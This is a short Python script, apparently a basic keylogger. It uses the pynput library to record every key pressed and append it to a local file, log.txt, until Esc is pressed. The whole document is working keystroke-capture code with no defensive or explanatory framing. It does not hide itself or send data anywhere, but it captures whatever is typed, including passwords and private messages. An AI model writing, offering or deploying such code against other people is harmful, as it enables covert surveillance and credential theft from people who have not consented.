import re

import pynput
from pynput.keyboard import Listener, Key


def write_files(keys):  # writing in a log file
    with open('log.txt', 'a') as log:
        log.write(keys)


def on_press(key):  # pressed keys
    if key == Key.space or key == Key.esc:
        write_files('\n')
    elif key == Key.backspace:
        write_files('<backspace> \n')
    else:
        key = str(key).replace("'", "")
        write_files(key)


def on_release(key):    # to make break in the loop
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()     # listens to the key pressed until break
